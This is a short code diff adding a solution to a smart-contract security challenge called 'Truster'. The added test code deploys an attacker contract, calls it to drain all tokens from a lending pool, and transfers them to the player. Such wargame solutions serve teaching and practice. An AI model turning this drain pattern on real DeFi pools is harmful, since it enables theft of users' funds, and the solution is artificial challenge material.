@@ -23,6 +23,13 @@ describe('[Challenge] Truster', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        let attackerContract = await (await ethers.getContractFactory('TrusterAttacker', player)).deploy(token.address, pool.address);
+
+        // The attack contract will take all the tokens from the pool.
+        await attackerContract.connect(player).attack(TOKENS_IN_POOL, player.address);
+        await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL)
+        //await token.connect(player).transferFrom(player.address, attack.address, TOKENS_IN_POOL);
+
     });
 
     after(async function () {
